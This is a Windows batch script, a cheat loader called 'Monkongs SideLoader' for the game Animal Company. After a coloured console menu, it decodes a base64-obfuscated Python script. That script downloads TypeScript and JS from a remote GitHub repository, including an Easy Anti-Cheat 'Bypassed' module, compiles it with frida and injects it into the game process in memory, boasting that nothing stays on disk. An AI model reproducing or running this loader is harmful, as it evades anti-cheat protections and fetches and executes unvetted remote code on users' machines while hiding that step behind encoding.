@echo off
cd /d "%~dp0"

color 0F
title Monkongs SideLoader

reg add "HKCU\Console" /v VirtualTerminalLevel /t REG_DWORD /d 1 /f >nul 2>&1
for /f "delims=" %%E in ('echo prompt $E ^| cmd') do set "ESC=%%E"

echo Setting up paths...
set "PATH=%PATH%;%APPDATA%\Python\Python312\Scripts"
set "PATH=%PATH%;%LOCALAPPDATA%\Programs\Python\Python313\Scripts"
set "PATH=%PATH%;C:\Users\%USERNAME%\AppData\Local\Python\pythoncore-3.14-64\Scripts"
set "PATH=%PATH%;%LOCALAPPDATA%\Python\pythoncore-3.14-64\Scripts"

echo.
echo %ESC%[91m----------------------------------%ESC%[0m
echo %ESC%[93mInstalling dependencies...%ESC%[0m
pip install frida frida-tools >nul 2>&1
call npm install -g frida-compile >nul 2>&1
echo %ESC%[92mReady%ESC%[0m
echo %ESC%[91m----------------------------------%ESC%[0m

setlocal enabledelayedexpansion
set "selected=1"

:menu
cls
call :showmenu
goto getkey

:showmenu
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
 "$s = %selected%; " ^
 "$r = [char]27; " ^
 "Write-Host ''; " ^
 "Write-Host ('  {0}[90m+=========================================+{0}[0m' -f $r); " ^
 "Write-Host ('  {0}[90m#{0}[0m  {0}[91mM{0}[93mO{0}[92mN{0}[96mK{0}[94mO{0}[95mN{0}[91mG{0}[93mS{0}[0m  {0}[92mS{0}[96mI{0}[94mD{0}[95mE{0}[91mL{0}[93mO{0}[92mA{0}[96mD{0}[94mE{0}[95mR{0}[0m  {0}[90m#{0}[0m' -f $r); " ^
 "Write-Host ('  {0}[90m+=========================================+{0}[0m' -f $r); " ^
 "Write-Host ('  {0}[90m#{0}[0m                                         {0}[90m#{0}[0m' -f $r); " ^
 "$opts = @('1. Start M4Quest only','2. Start EAC Defuser only','3. Start Everything','4. PC Mode (EAC Defuse Always On)'); " ^
 "$colors = @('92','96','93','95'); " ^
 "for ($i=0; $i -lt 4; $i++) { " ^
 "  $c = $colors[$i]; " ^
 "  if (($i+1) -eq $s) { " ^
 "    Write-Host ('  {0}[90m#{0}[0m  {0}[97m^>{0}[0m {0}[{1}m{2}{0}[90m#{0}[0m' -f $r,$c,$opts[$i].PadRight(38)) " ^
 "  } else { " ^
 "    Write-Host ('  {0}[90m#{0}[0m    {0}[{1}m{2}{0}[90m#{0}[0m' -f $r,$c,$opts[$i].PadRight(38)) " ^
 "  } " ^
 "} " ^
 "Write-Host ('  {0}[90m#{0}[0m                                         {0}[90m#{0}[0m' -f $r); " ^
 "Write-Host ('  {0}[90m#{0}[0m  {0}[36mUp/Down Navigate  -  Enter Select    {0}[90m#{0}[0m' -f $r); " ^
 "Write-Host ('  {0}[90m+=========================================+{0}[0m' -f $r); " ^
 "Write-Host ''"

exit /b 0

:getkey
for /f "delims=" %%A in ('powershell -NoProfile -Command "$k = $host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown'); Write-Output $k.VirtualKeyCode"') do set "key=%%A"
if "!key!"=="38" (
    set /a selected-=1
    if !selected! lss 1 set "selected=4"
    goto menu
)
if "!key!"=="40" (
    set /a selected+=1
    if !selected! gtr 4 set "selected=1"
    goto menu
)
if "!key!"=="13" goto selected_!selected!
goto getkey

:selected_1
cls
echo.
echo  %ESC%[93mFetching scripts from server...%ESC%[0m
call :runInject quest
pause >nul
goto menu

:selected_2
cls
echo.
echo  %ESC%[93mFetching scripts from server...%ESC%[0m
call :runInject eac
pause >nul
goto menu

:selected_3
cls
echo.
echo  %ESC%[93mFetching scripts from server...%ESC%[0m
call :runInject all
pause >nul
goto menu

:selected_4
cls
echo.
echo  %ESC%[93mFetching scripts from server...%ESC%[0m
call :runInject pcmode
pause >nul
goto menu

:runInject
set "PYTEMP=%TEMP%\monkong_%RANDOM%.py"
powershell -NoProfile -ExecutionPolicy Bypass -Command "[IO.File]::WriteAllText('%PYTEMP%', [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0IGZyaWRhLCBzeXMsIG9zLCB1cmxsaWIucmVxdWVzdCwgdGltZSwgdGVtcGZpbGUsIHNodXRpbCwgc3VicHJvY2VzcwoKR0FNRSA9IHIiQzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxTdGVhbVxzdGVhbWFwcHNcY29tbW9uXEFuaW1hbCBDb21wYW55XEFuaW1hbENvbXBhbnkuZXhlIgpCQVNFID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9tb25rb25nbGl2ZS1kZXYvTWVudVNlcnZlcnMvbWFpbiIKClNDUklQVFMgPSB7CiAgICAiYnJpZGdlIjogeyJ1cmwiOiAiL2ZyaWRhLWlsMmNwcC1icmlkZ2UuanMiLCAiYWx3YXlzIjogVHJ1ZX0sCiAgICAic3ltYm9scyI6IHsidXJsIjogIi9zeW1ib2xzLnRzIiwgImFsd2F5cyI6IFRydWV9LAogICAgIm1lbnUiOiB7InVybCI6ICIvTW9ua3NNZW51LnRzIiwgIm1vZGVzIjogWyJtZW51IiwgImFsbCJdfSwKICAgICJlYWMiOiB7InVybCI6ICIvQnlwYXNzZWQvZWFjLnRzIiwgIm1vZGVzIjogWyJlYWMiLCAiYWxsIiwgInBjbW9kZSJdfSwKICAgICJzdHVmZiI6IHsidXJsIjogIi9CeXBhc3NlZC9zdHVmZi5qcyIsICJtb2RlcyI6IFsiZWFjIiwgImFsbCIsICJwY21vZGUiXX0sCiAgICAicGNtb2RlIjogeyJ1cmwiOiAiL3BjbW9kZS50cyIsICJtb2RlcyI6IFsicGNtb2RlIl19LAogICAgInF1ZXN0IjogeyJ1cmwiOiAiL200cXVlc3QudHMiLCAibW9kZXMiOiBbInF1ZXN0IiwgImFsbCJdfSwKICAgICJycGMiOiB7InVybCI6ICIvZGlzY29yZHJwYy50cyIsICJtb2RlcyI6IFsiYWxsIl19LAp9CgpkZWYgZmV0Y2godXJsKToKICAgIHRyeToKICAgICAgICByID0gdXJsbGliLnJlcXVlc3QuUmVxdWVzdCh1cmwsIGhlYWRlcnM9eyJVc2VyLUFnZW50IjogIk1vbmtzTWVudS8xLjAifSkKICAgICAgICByZXR1cm4gdXJsbGliLnJlcXVlc3QudXJsb3BlbihyLCB0aW1lb3V0PTE1KS5yZWFkKCkuZGVjb2RlKCJ1dGYtOCIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiIgIFshXSBGYWlsZWQ6IHtlfSIpCiAgICAgICAgcmV0dXJuIE5vbmUKCmRlZiBjb21waWxlX3RzKHNvdXJjZSwgbmFtZSwgdG1wZGlyKToKICAgIHRzX3BhdGggPSBvcy5wYXRoLmpvaW4odG1wZGlyLCBmIntuYW1lfS50cyIpCiAgICBqc19wYXRoID0gb3MucGF0aC5qb2luKHRtcGRpciwgZiJ7bmFtZX0uanMiKQogICAgd2l0aCBvcGVuKHRzX3BhdGgsICJ3IiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICBmLndyaXRlKHNvdXJjZSkKICAgIHRyeToKICAgICAgICByZXN1bHQgPSBzdWJwcm9jZXNzLnJ1bigKICAgICAgICAgICAgWyJucHgiLCAiZnJpZGEtY29tcGlsZSIsIHRzX3BhdGgsICItbyIsIGpzX3BhdGhdLAogICAgICAgICAgICBjYXB0dXJlX291dHB1dD1UcnVlLCB0ZXh0PVRydWUsIHRpbWVvdXQ9MzAKICAgICAgICApCiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoanNfcGF0aCk6CiAgICAgICAgICAgIHdpdGggb3Blbihqc19wYXRoLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgICAgICAgICByZXR1cm4gZi5yZWFkKCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludChmIiAgWyFdIGZyaWRhLWNvbXBpbGUgZmFpbGVkOiB7cmVzdWx0LnN0ZGVycls6MjAwXX0iKQogICAgICAgICAgICByZXR1cm4gTm9uZQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiICBbIV0gQ29tcGlsZSBlcnJvcjoge2V9IikKICAgICAgICByZXR1cm4gTm9uZQoKbW9kZSA9IHN5cy5hcmd2WzFdIGlmIGxlbihzeXMuYXJndikgPiAxIGVsc2UgIm1lbnUiCnByaW50KGYiXG5bKl0gTW9kZToge21vZGUudXBwZXIoKX0iKQpwcmludCgiWypdIFJlYWRpbmcgd2ViIHN0cmVhbS4uLlxuIikKCnVybHMgPSBbXQpmb3IgbmFtZSwgaW5mbyBpbiBTQ1JJUFRTLml0ZW1zKCk6CiAgICBhbHdheXMgPSBpbmZvLmdldCgiYWx3YXlzIiwgRmFsc2UpCiAgICBtb2RlcyA9IGluZm8uZ2V0KCJtb2RlcyIsIFtdKQogICAgdXJsID0gaW5mby5nZXQoInVybCIsICIiKQogICAgaWYgdXJsIGFuZCAoYWx3YXlzIG9yIG1vZGUgaW4gbW9kZXMgb3IgbW9kZSA9PSAiYWxsIik6CiAgICAgICAgZnVsbCA9IHVybCBpZiB1cmwuc3RhcnRzd2l0aCgiaHR0cCIpIGVsc2UgZiJ7QkFTRX17dXJsfSIKICAgICAgICB1cmxzLmFwcGVuZCh7Im5hbWUiOiBuYW1lLCAidXJsIjogZnVsbH0pCgpsb2FkZWQgPSBbXQp0bXBkaXIgPSB0ZW1wZmlsZS5ta2R0ZW1wKHByZWZpeD0ibW9ua29uZ19jb21waWxlXyIpCmZvciBzIGluIHVybHM6CiAgICBwcmludChmIiAgUmVhZGluZyB3ZWIgcmVzcG9uc2U6IHtzWyduYW1lJ119Li4uIikKICAgIHNyYyA9IGZldGNoKHNbInVybCJdKQogICAgaWYgc3JjOgogICAgICAgIGxvYWRlZC5hcHBlbmQoKHNbIm5hbWUiXSwgc3JjKSkKICAgICAgICBwcmludChmIiAgWytdIEdvdCB7c1snbmFtZSddfSAoe2xlbihzcmMpfSBieXRlcykiKQogICAgZWxzZToKICAgICAgICBwcmludChmIiAgWyFdIFNraXBwZWQge3NbJ25hbWUnXX0iKQoKaWYgbm90IGxvYWRlZDoKICAgIHByaW50KCJbIV0gTm8gc2NyaXB0cyBmZXRjaGVkIikKICAgIHNodXRpbC5ybXRyZWUodG1wZGlyLCBpZ25vcmVfZXJyb3JzPVRydWUpCiAgICBzeXMuZXhpdCgxKQoKcHJpbnQoZiJcblsqXSBDb21waWxpbmcgVHlwZVNjcmlwdC4uLiIpCmNvbXBpbGVkID0gW10KZm9yIG5hbWUsIHNyYyBpbiBsb2FkZWQ6CiAgICBpZiBuYW1lLmVuZHN3aXRoKCIudHMiKToKICAgICAgICBqcyA9IGNvbXBpbGVfdHMoc3JjLCBuYW1lLCB0bXBkaXIpCiAgICAgICAgaWYganM6CiAgICAgICAgICAgIGNvbXBpbGVkLmFwcGVuZCgobmFtZSwganMpKQogICAgICAgICAgICBwcmludChmIiAgWytdIENvbXBpbGVkIHtuYW1lfSIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoZiIgIFshXSBGYWlsZWQgdG8gY29tcGlsZSB7bmFtZX0sIHNraXBwaW5nIikKICAgIGVsc2U6CiAgICAgICAgY29tcGlsZWQuYXBwZW5kKChuYW1lLCBzcmMpKQogICAgICAgIHByaW50KGYiICBbK10gSlMgcmVhZHkge25hbWV9IikKCnNodXRpbC5ybXRyZWUodG1wZGlyLCBpZ25vcmVfZXJyb3JzPVRydWUpCgpwcmludChmIlxuWypdIFNwYXduaW5nIEFuaW1hbENvbXBhbnkuZXhlLi4uIikKdHJ5OgogICAgcGlkID0gZnJpZGEuc3Bhd24oW0dBTUVdKQogICAgc2Vzc2lvbiA9IGZyaWRhLmdldF9sb2NhbF9kZXZpY2UoKS5hdHRhY2gocGlkKQogICAgcHJpbnQoZiJbKl0gU3Bhd25lZCBQSUQge3BpZH0iKQogICAgZnJpZGEucmVzdW1lKHBpZCkKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgcHJpbnQoZiJbIV0gU3Bhd24gZmFpbGVkOiB7ZX0iKQogICAgc3lzLmV4aXQoMSkKCmZvciBuYW1lLCBzcmMgaW4gY29tcGlsZWQ6CiAgICB0cnk6CiAgICAgICAgcyA9IHNlc3Npb24uY3JlYXRlX3NjcmlwdChzcmMsIG5hbWU9bmFtZSkKICAgICAgICBzLmxvYWQoKQogICAgICAgIHByaW50KGYiICBbK10gSW5qZWN0ZWQge25hbWV9IikKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIiAgWyFdIEZhaWxlZCB7bmFtZX06IHtlfSIpCgpwcmludChmIlxuWypdIHtsZW4oY29tcGlsZWQpfSBzY3JpcHQocykgaW4gbWVtb3J5IikKcHJpbnQoIlsqXSBOb3RoaW5nIG9uIGRpc2sgLSBhbGwgdHJhbnNtaXR0ZWQiKQpwcmludCgiWypdIFByZXNzIEN0cmwrQyB0byBkZXRhY2hcbiIpCnRyeToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdGltZS5zbGVlcCgxKQpleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICBwcmludCgiXG5bKl0gRGV0YWNoaW5nLi4uIikKICAgIHNlc3Npb24uZGV0YWNoKCkKICAgIHByaW50KCJbKl0gRG9uZSIp')))"
python "%PYTEMP%" %1
del /f /q "%PYTEMP%" >nul 2>&1
